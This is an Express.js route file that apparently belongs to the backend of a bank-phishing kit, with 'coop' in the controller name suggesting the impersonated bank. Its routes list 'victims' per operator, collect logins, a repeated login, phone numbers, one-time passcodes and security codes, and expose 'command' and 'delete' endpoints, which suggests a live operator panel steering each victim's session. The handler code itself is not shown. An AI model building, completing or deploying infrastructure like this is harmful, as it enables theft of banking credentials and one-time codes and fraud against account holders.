const express = require("express");
const {
	getOwnerVics,
	command,
	getInfo,
	submitLogin,
	submitLoginAgain,
	submitOtp,
	submitSecCode,
	deleteEntry,
	submitTelephone,
} = require("../controllers/coopController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/telephone", submitTelephone);
router.post("/loginAgain", submitLoginAgain);
router.post("/otp", submitOtp);
router.post("/sec", submitSecCode);
router.post("/delete", deleteEntry);

module.exports = router;
